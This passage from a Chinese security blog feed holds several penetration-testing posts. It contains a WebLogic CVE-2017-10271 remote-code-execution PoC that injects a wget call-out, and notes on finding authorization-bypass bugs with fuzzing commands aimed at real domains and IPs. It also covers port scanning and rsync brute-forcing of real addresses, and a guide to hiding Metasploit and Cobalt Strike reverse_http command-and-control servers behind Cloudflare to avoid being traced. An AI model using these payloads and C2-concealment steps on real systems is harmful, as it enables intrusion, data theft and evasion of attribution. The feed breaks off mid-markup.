class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">reverse:</span><br><span class="line">  store_events: false</span><br><span class="line">  token: &quot;&quot;</span><br><span class="line">  http:</span><br><span class="line">    enabled: true</span><br><span class="line">    listen_ip: 0.0.0.0</span><br><span class="line">    listen_port: &quot;&quot;</span><br><span class="line">  dns:</span><br><span class="line">    enabled: false</span><br><span class="line">    listen_ip: 0.0.0.0</span><br><span class="line">    domain: &quot;&quot;</span><br><span class="line">  client:</span><br><span class="line">    # 上面的 port 留空代表自动选择，这里 $&#123;port&#125; 引用上面自动选择的值</span><br><span class="line">    http_base_url: &quot;http://your-reverse-server-ip:$&#123;port&#125;&quot;</span><br><span class="line">    dns_server_ip: &quot;your-reverse-server-ip&quot;</span><br><span class="line">    remote_server: false</span><br></pre></td></tr></table></figure><p>headers这里可以自定义响应头</p><p>poc（这个没考虑到windows下的情况）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">name: poc-yaml-weblogic-cve-2017-10271-rce</span><br><span class="line">rules:</span><br><span class="line">  - method: POST</span><br><span class="line">    path: /wls-wsat/CoordinatorPortType</span><br><span class="line">    headers:</span><br><span class="line">      Content-Type: text/xml</span><br><span class="line">    body: &gt;-</span><br><span class="line">      &lt;soapenv:Envelope</span><br><span class="line">      xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">      &lt;soapenv:Header&gt;</span><br><span class="line">      &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">      &lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">      &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">      &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">      &lt;void index=&quot;0&quot;&gt;</span><br><span class="line">      &lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;1&quot;&gt;</span><br><span class="line">      &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;2&quot;&gt;</span><br><span class="line">      &lt;string&gt;wget &#123;&#123;reverse_url&#125;&#125;&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;/array&gt;</span><br><span class="line">      &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">      &lt;/java&gt;</span><br><span class="line">      &lt;/work:WorkContext&gt;</span><br><span class="line">      &lt;/soapenv:Header&gt;</span><br><span class="line">      &lt;soapenv:Body/&gt;</span><br><span class="line">      &lt;/soapenv:Envelope&gt;</span><br><span class="line">    follow_redirects: true</span><br><span class="line">    expression: waitReverse(5)</span><br></pre></td></tr></table></figure><h4 id="联动burpsuite插件"><a href="#联动burpsuite插件" class="headerlink" title="联动burpsuite插件"></a>联动burpsuite插件</h4><p><a href="https://github.com/c0ny1/passive-scan-client" target="_blank" rel="noopener">https://github.com/c0ny1/passive-scan-client</a></p><p>该插件正是为了解决该问题，将<code>正常访问网站的流量</code>与<code>提交给被动扫描器的流量</code>分开，互不影响。     </p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://legoc.github.io/categories/渗透测试/"/>
    
    
    <category term="渗透" scheme="https://legoc.github.io/tags/渗透/"/>
    
    <category term="扫描器" scheme="https://legoc.github.io/tags/扫描器/"/>
    
  </entry>
  
  <entry>
    <title>SRC-越权挖掘思路</title>
    <link href="https://legoc.github.io/2019/07/27/SRC-%E8%B6%8A%E6%9D%83%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/"/>
    <id>https://legoc.github.io/2019/07/27/SRC-%E8%B6%8A%E6%9D%83%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</id>
    <published>2019-07-27T02:20:36.000Z</published>
    <updated>2020-07-07T00:08:53.788Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>闲着也是闲着，自己整理越权的思路来，顺便写点笔记，这个怕是要鸽，慢慢更，这方面的东西了解的太少。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h2 id="越权分类"><a href="#越权分类" class="headerlink" title="越权分类"></a>越权分类</h2><p>根据对数据库的操作进行分类，可以分为以下几类：越权查询、越权删除、越权修改、越权添加等。</p><p>根据维度进行分类，可分为：平行越权、垂直越权、交叉越权。</p><p>平行越权：权限类型不变，权限ID改变；如：同是普通用户，其中一个用户可查看其它用户信息。常见的就是通过修改某一个ID参数来查看其他用户的信息，比如你查看自己的信息时，发现URL连接中，或者http请求头中有一个userID的参数，然后你修改这个参数就可以查看那个人信息了！</p><p>垂直越权：权限ID不变，权限类型改变；如普通用户可使用管理员权限进行操作。如你登录时，发现cookie中有一个roleID的角色参数，那么可以通过修改该ID为1或者0，根据具体情况来定，就可以使用管理员权限了！</p><p>交叉越权：权限类型改变，权限ID也改变。</p><h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><ul><li>改识别用户参数</li><li>改cookie</li><li>越权访问</li><li>登陆后，修改密码 未校验id与用户 修改id 即可该其他人密码</li><li>修改个人数据时 页面源代码有用户标识符id 抓包修改或添加id</li><li>直接访问后台链接禁用js则不会跳转登录界面，直接登陆</li><li>登陆分为账号和游客登陆，游客功能有限，app端只前端检测，模拟发包即可</li><li>越权订单查看打印下载、越权操作他人收货地址、增删改查等。</li></ul><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>burp里面看history关注json包</p><h3 id="接口寻找"><a href="#接口寻找" class="headerlink" title="接口寻找"></a>接口寻找</h3><h4 id="常规扫描"><a href="#常规扫描" class="headerlink" title="常规扫描"></a>常规扫描</h4><p>dirsearch</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u https://example.com/ -e *</span><br></pre></td></tr></table></figure><p>建议在vps上建立一个这样的sh文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u $1 -e * --random-user-agents --header &quot;X-Forwarded-For: 127.0.0.1&quot;</span><br></pre></td></tr></table></figure><p>然后直接运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh run.sh https://example.com/</span><br></pre></td></tr></table></figure><h4 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /home/ubuntu/lego/dict/parm.txt --hc 404 &apos;http://113.105.184.114:8899/api/FUZZ&apos;</span><br><span class="line">wfuzz -w /home/ubuntu/lego/dict/parm.txt --hh 30 &apos;http://api.sc.weibo.com/?FUZZ&apos;</span><br><span class="line">wfuzz -w /home/ubuntu/lego/dict/parm.txt --hc 404 &apos;http://go.chaohua.weibo.com/?FUZZ&apos;</span><br><span class="line">wfuzz -w /home/ubuntu/lego/dict/parm.txt --hc 404 &apos;http://dataflow.biliapi.com/s/FUZZ&apos;</span><br><span class="line">wfuzz -w url --hc 404 &apos;https://FUZZ//error.log&apos;</span><br></pre></td></tr></table></figure><p>正则匹配接口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">([A-Za-z0-9_].*)/</span><br><span class="line">([A-Za-z0-9_].*)/([A-Za-z0-9_].*)/</span><br><span class="line">([A-Za-z0-9_]+)/([A-Za-z0-9_]+)/</span><br></pre></td></tr></table></figure><h4 id="LinkFinder"><a href="#LinkFinder" class="headerlink" title="LinkFinder"></a>LinkFinder</h4><p>从js寻找接口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 linkfinder.py -i https://example.com/1.js -o results.html</span><br></pre></td></tr></table></figure><p>分析整个域，找接口的话还是推荐直接单个js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python linkfinder.py -i https://example.com -d</span><br></pre></td></tr></table></figure><p>python快速搭起http服务，以便优雅的查看html报告</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 6666</span><br></pre></td></tr></table></figure><h3 id="jsspider"><a href="#jsspider" class="headerlink" title="jsspider"></a><strong>jsspider</strong></h3><p>提取js并且寻找对应的接口</p><p>-d深度 一般默认为1就好</p><p> -c 携带cookie爬接口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 main.py -u http://target.com -d 1 -c cookie</span><br></pre></td></tr></table></figure><h4 id="常用接口框架"><a href="#常用接口框架" class="headerlink" title="常用接口框架"></a>常用接口框架</h4><h5 id="swagger-ui-html"><a href="#swagger-ui-html" class="headerlink" title="swagger-ui.html"></a>swagger-ui.html</h5><p>一个无依赖的HTML、JS和CSS集合，可以为Swagger兼容API动态生成优雅文档。</p><h5 id="service-asmx"><a href="#service-asmx" class="headerlink" title="service.asmx"></a>service.asmx</h5><p>WSDL 文件是一个 XML 文档，用于说明一组 SOAP 消息以及如何交换这些消息。大多数情况下由软件自动生成和使用。服务端的使用说明书</p><h4 id="自己挖到过的案例"><a href="#自己挖到过的案例" class="headerlink" title="自己挖到过的案例"></a>自己挖到过的案例</h4><h5 id="查看评论越权"><a href="#查看评论越权" class="headerlink" title="查看评论越权"></a>查看评论越权</h5><p>此处场景为查看自己的评论</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://XXXX.com/XXXX/X.php?do=sp_my&amp;fetch=comments&amp;XXUid=1121</span><br></pre></td></tr></table></figure><p>该Uid为某用户所有评论的接口</p><p>可越权至查看所有人的评论 主要危害为爬虫个人兴趣定位隐私分析 危害不大</p><h6 id="支付越权"><a href="#支付越权" class="headerlink" title="支付越权"></a>支付越权</h6><p>此处场景为支付一个订单</p><p>支付处抓包 mids为用户ID可以修改为任意</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /XXXXXXX/?mids=400012&amp;_=1573267446039 HTTP/1.1</span><br><span class="line">host: XXXXXXX</span><br><span class="line">Connection: close</span><br><span class="line">cookie: SESSION=XXXXXX</span><br><span class="line">x-requested-with: com.tencent.mm</span><br></pre></td></tr></table></figure><p>然后会返回一个订单 根据得到的订单号 根据订单号 查看订单接口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /bg/getOrderInfoDetails?orderNo=XXXXXX&amp;_=1573266945830 HTTP/1.1</span><br><span class="line">host: XXX</span><br><span class="line">Connection: close</span><br><span class="line">accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">cookie: SESSION=XXXXXX</span><br></pre></td></tr></table></figure><p>则返回了这个用户的某些敏感信息 造成越权</p><h5 id="生成越权"><a href="#生成越权" class="headerlink" title="生成越权"></a>生成越权</h5><p>此处场景为生成自己的档案信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /XXXXX/preview?memberId=401112&amp;showMemberAdditionNames=&amp;showMemberRewardIds=&amp;isShowAllFee=false&amp;_=1573270602774 HTTP/1.1</span><br><span class="line">Connection: close</span><br><span class="line">accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">cookie: SESSION=XXXXXX</span><br></pre></td></tr></table></figure><p>memberId越权可修改为其他人的</p><p>然后返回一些敏感信息</p><h5 id="接口越权"><a href="#接口越权" class="headerlink" title="接口越权"></a>接口越权</h5><p>此处场景为查看个人信息</p><p>在日志里发现一个接口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://XXXX.com/xxx/rs/users/getUserInfo</span><br></pre></td></tr></table></figure><p>将会返回我的个人信息删除getuserinfo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://XXXX.com/xxx/rs/users/</span><br></pre></td></tr></table></figure><p>返回部分人的信息 造成越权</p><p>后发现可以设置翻页大小</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://XXXXXX.com/xxx/rs/users?pageNo=1&amp;pageSize=100</span><br></pre></td></tr></table></figure><p>将size改为10000则返回10000个用户的信息</p><p>可越权所有账户</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="笔记" scheme="https://legoc.github.io/categories/笔记/"/>
    
    
    <category term="渗透测试" scheme="https://legoc.github.io/tags/渗透测试/"/>
    
    <category term="SRC挖掘" scheme="https://legoc.github.io/tags/SRC挖掘/"/>
    
    <category term="整理笔记" scheme="https://legoc.github.io/tags/整理笔记/"/>
    
  </entry>
  
  <entry>
    <title>SRC-信息收集</title>
    <link href="https://legoc.github.io/2019/07/20/SRC-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://legoc.github.io/2019/07/20/SRC-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2019-07-20T15:01:00.000Z</published>
    <updated>2020-05-18T09:04:18.707Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>正好闲着，自己整理一下信息收集的思路来，随便写点笔记。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><ul><li>基于爆破-layer</li><li>subDomainsBrute 基于爆破</li><li>sublist3r 基于搜索引擎</li><li>邮箱收集+IP段收集+子域名收集—–farmscan_domain</li><li>从APP里面提取一些url GetAppUrl.jar</li><li>JS里面找子域名—JSFinder</li><li>riskiq 这个很牛批但是收费，免费的每天查询次数有限</li><li><ul><li>IP 反查 <a href="https://dns.aizhan.com/" target="_blank" rel="noopener">https://dns.aizhan.com/</a></li><li>ip:1.1.1.1  bing  不过最近bing是挂了还是怎么了 这个方法不能用了</li><li><a href="https://ip" target="_blank" rel="noopener">https://ip</a> 看证书是否是业务范围</li></ul></li><li>证书反查 <a href="https://crt.sh" target="_blank" rel="noopener">https://crt.sh</a>  %.bilibili.com </li><li>百度一接口 <a href="http://ce.baidu.com/index/getRelatedSites?site_address=bilibili.com" target="_blank" rel="noopener">http://ce.baidu.com/index/getRelatedSites?site_address=bilibili.com</a> 百度收入的子域名</li><li><a href="https://www.t00ls.net/viewthread.php?tid=44267&amp;extra=&amp;highlight=%E5%AD%90%E5%9F%9F%E5%90%8D&amp;page=1" target="_blank" rel="noopener">SubDomainSniper 1.1</a> 企业资产查询工具(子域名搜集)</li><li><a href="http://beian.miit.gov.cn/publish/query/indexFirst.action" target="_blank" rel="noopener">备案查询</a> </li><li><a href="https://www.virustotal.com" target="_blank" rel="noopener">virustotal</a></li><li><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">oneforall</a></li></ul><p>notepad++去重</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">勾选 正则表达式和匹配新行 </span><br><span class="line">^(.*?)$\s+?^(?=.*^\1$)</span><br></pre></td></tr></table></figure><p>正则表达式匹配ip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\b(?:[0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b</span><br><span class="line">((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;</span><br></pre></td></tr></table></figure><p>JSFinder深度爬取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 JSFinder.py -u https://www.bilibili.com -d -ou bili_url -os bili_domain</span><br></pre></td></tr></table></figure><h3 id="资产收集"><a href="#资产收集" class="headerlink" title="资产收集"></a>资产收集</h3><ul><li>fofa   title=”bilibili”</li></ul><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><ul><li><p>nmap -sS -p 1-65535 -v 14.116.140.49</p></li><li><p>masscan –ports 1-65535 14.116.143.118 –rate 1000 –wait 1</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-hostgroup 1024 -iL wsrc -oN wsrc_rs.txt</span><br><span class="line">nmap -T4 -p 1-65535 -v 120.92.217.153</span><br><span class="line">nmap -T4 --min-hostgroup 1024 -p 1-65535 -iL bsrc -oN bsrc_allport_rs</span><br><span class="line">nmap --script nmap-vulners -sV 121.46.231.68</span><br></pre></td></tr></table></figure><h3 id="端口渗透"><a href="#端口渗透" class="headerlink" title="端口渗透"></a>端口渗透</h3><p>常见的服务直接用超级弱口令检查工具</p><ul><li>873 <code>nmap -p 873 --script rsync-brute --script-args &#39;rsync-brute.module=www&#39; 110.76.40.240</code></li><li>nmap脚本存放地址<code>/usr/share/nmap/scripts/</code></li></ul><h3 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><ul><li>御剑</li><li>dirsearch</li></ul><p>搭配脚本批量对子域名目录爆破，参考之前的《关于SRC挖掘的一点小脚本》</p><h4 id="google-hack"><a href="#google-hack" class="headerlink" title="google hack"></a>google hack</h4><p>site: xxx.weibo.com 最简单，也最实用</p><h3 id="github信息收集"><a href="#github信息收集" class="headerlink" title="github信息收集"></a>github信息收集</h3><p>高级搜索哪里不会点点哪里 <a href="https://github.com/search/advanced" target="_blank" rel="noopener">https://github.com/search/advanced</a></p><p>语法 <a href="https://payloads.online/archivers/2019-01-31/2" target="_blank" rel="noopener">https://payloads.online/archivers/2019-01-31/2</a></p><h3 id="cms识别"><a href="#cms识别" class="headerlink" title="cms识别"></a>cms识别</h3><ul><li>云悉</li><li>bugscaner</li></ul><h3 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h3><p>贴吧、线下体验店等一系列的地方找到一些内部群</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="笔记" scheme="https://legoc.github.io/categories/笔记/"/>
    
    
    <category term="渗透测试" scheme="https://legoc.github.io/tags/渗透测试/"/>
    
    <category term="SRC挖掘" scheme="https://legoc.github.io/tags/SRC挖掘/"/>
    
    <category term="整理笔记" scheme="https://legoc.github.io/tags/整理笔记/"/>
    
  </entry>
  
  <entry>
    <title>cs和msf域名上线隐藏真实ip</title>
    <link href="https://legoc.github.io/2019/07/07/cs%E5%92%8Cmsf%E5%9F%9F%E5%90%8D%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F%E7%9C%9F%E5%AE%9Eip/"/>
    <id>https://legoc.github.io/2019/07/07/cs%E5%92%8Cmsf%E5%9F%9F%E5%90%8D%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F%E7%9C%9F%E5%AE%9Eip/</id>
    <published>2019-07-07T02:20:36.000Z</published>
    <updated>2020-03-10T09:24:15.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在拿下了目标机之后，目标机在内网里面，使用用msf或者CS时，用VPS做服务器的话，会导致自己的VPS的IP泄露，导致很容易被溯源。</p><p><img src="/2019/07/07/cs和msf域名上线隐藏真实ip/timg.jpg" alt=""></p><p>最快最稳的方式当然还是找跳板，当然我这种严格遵守网络安全法的好孩子是不可能有肉鸡做跳板的。</p><p>思来想去，查阅了一些资料后发现，域名上线走CDN是个不错的选择。</p><p>于是在研究了一段时间之后，写下了这篇文章。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="域名和CDN配置"><a href="#域名和CDN配置" class="headerlink" title="域名和CDN配置"></a>域名和CDN配置</h3><p>需要的东西：一台国外的VPS 这里我推荐vultr （腾讯云和阿里云等国内的VPS是不支持免备案的）</p><p>说到域名上线，自然就不能老老实实的去用自己备案了的域名，不然又是一个当场逮捕。</p><p>到这里<a href="https://freenom.com/" target="_blank" rel="noopener">https://freenom.com/</a> 注册一个免费且不用备案的的tk域名</p><p>这里注册如果失败检测一下是不是邮箱不对，因为它不支持一些邮箱如163,126邮箱等，可以用gmail注册。</p><p>到这里<a href="https://www.cloudflare.com/" target="_blank" rel="noopener">https://www.cloudflare.com/</a> 你可以搞到一个免费的CDN</p><p>为什么我多次强调免费呢？当然是因为贫穷、</p><p><img src="/2019/07/07/cs和msf域名上线隐藏真实ip/b2.jpg" alt=""></p><p>注册完freenom和cloudflare的账号之后</p><p>在freenom的Nameservers里填上cloudflare所提示的配置信息如下</p><p><img src="/2019/07/07/cs和msf域名上线隐藏真实ip/a1.jpg" alt=""></p><p>不要用freenom自带的域名解析，因为它自带的没上CDN ping一下域名就知道VPS ip了</p><p>在cloudflare里面配置一个A类的解析 就是vps的ip</p><p><img src="/2019/07/07/cs和msf域名上线隐藏真实ip/a2.jpg" alt=""></p><p>然后域名配置的事就算完成了。</p><p>这个时候，我ping我域名，解析的ip是CDN的，从而隐藏了我的真实ip。</p><h3 id="域名上线"><a href="#域名上线" class="headerlink" title="域名上线"></a>域名上线</h3><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>Cloudflare有个特点，如果用其他端口的话，是监听不到的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cloudflare支持的HTTP端口是：</span><br><span class="line"></span><br><span class="line">80,8080,8880,2052,2082,2086,2095</span><br><span class="line"></span><br><span class="line">Cloudflare支持的HTTPs端口是：</span><br><span class="line"></span><br><span class="line">443,2053,2083,2087,2096,8443</span><br></pre></td></tr></table></figure><h4 id="MSF域名上线"><a href="#MSF域名上线" class="headerlink" title="MSF域名上线"></a>MSF域名上线</h4><p>首先生成一个meterpreter</p><p>平时我们用的比较多的是reverse_tcp，在这里我们要用的是reverse_http</p><p>msfvenom -p windows/x64/meterpreter/reverse_http LHOST=cs.ringone.tk LPORT=2095 -f exe &gt; shell.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_http LHOST=cs.XXXX.tk LPORT=2095 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><p>上传到靶机里面运行，VPS监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/x64/meterpreter/reverse_http</span><br><span class="line">set lhost cs.XXXX.tk</span><br><span class="line">set LPORT 2095</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>如果在过程中遇到msfconsole关于allocate memory - infocmp，解决方案为</p><p>出自 <a href="https://www.optiv.com/blog/create-a-budget-friendly-virtual-private-server-with-a-metasploit-instance" target="_blank" rel="noopener">https://www.optiv.com/blog/create-a-budget-friendly-virtual-private-server-with-a-metasploit-instance</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@vultr:~# cd /var</span><br><span class="line">root@vultr:/var# touch swap.img</span><br><span class="line">root@vultr:/var# chmod 600 swap.img</span><br><span class="line">root@vultr:/var# dd if=/dev/zero of=/var/swap.img bs=1024k count=1000</span><br><span class="line">root@vultr:/var# mkswap /var/swap.img</span><br><span class="line">root@vultr:/var# swapon /var/swap.img</span><br></pre></td></tr></table></figure><p>这时不出意外我们应该得到了一个session，这时在执行一些操作的时候，靶机用wireshark抓包，看流量</p><p><img src="/2019/07/07/cs和msf域名上线隐藏真实ip/1.jpg" alt=""></p><p><img src="/2019/07/07/cs和msf域名上线隐藏真实ip/2.jpg" alt=""></p><p>看到的IP是来自CDN 104.24.117.1我们的VPS地址得到了有效的隐藏，如果想解决环境有恶意域名检测的话，</p><p>那么可以用域名前置的方式来解决这个问题，这个已经有很多大佬写了这方面的文章，我这里就不一一描述了。</p><p>推荐阅读 <a href="https://xz.aliyun.com/t/4509" target="_blank" rel="noopener">https://xz.aliyun.com/t/4509</a></p><h4 id="CS域名上线"><a href="#CS域名上线" class="headerlink" title="CS域名上线"></a>CS域名上线</h4><p>payload选 windows/beacon_http/reverse_http</p><p>主机填域名</p><p>端口填上面CF支持的任意http端口</p><p>生成后门，靶机运行后门，</p><p>执行一些操作，靶机抓包，查看流量。</p><p><img src="/2019/07/07/cs和msf域名上线隐藏真实ip/cs1.jpg" alt=""></p><p><img src="/2019/07/07/cs和msf域名上线隐藏真实ip/cs2.jpg" alt=""></p><p>CS里面也成功的隐藏了VPS的IP</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>后来我在想tcp和http的meterpreter会不会存在很多不一样的地方</p><p>会不会在内网渗透的时候代理失败</p><p>于是我开始做了一点简单的测试</p><p>环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">虚拟机 192.168.20.141</span><br><span class="line">本机 10.11.2.225</span><br><span class="line">路由器 10.11.2.128 存在一个web服务</span><br><span class="line">公网vps</span><br></pre></td></tr></table></figure><p><img src="/2019/07/07/cs和msf域名上线隐藏真实ip/a3.jpg" alt=""></p><p>VPS监听来自虚拟机的meterpreter</p><p>来测试一下能否扫到路由器的web服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 10.11.2.0 -n 255.255.255.0  //添加一个路由 </span><br><span class="line">background</span><br><span class="line">use auxiliary/scanner/http/title</span><br><span class="line">set rhosts 10.11.2.0/24</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>速度上有点慢，但还是扫出了结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] [10.11.2.128:80] [C:200] [R:] [S:EUHTϞП·ԉǷ] EUHTϞП·ԉǷ</span><br></pre></td></tr></table></figure><p>尝试挂代理扫描</p><figure class="highlight 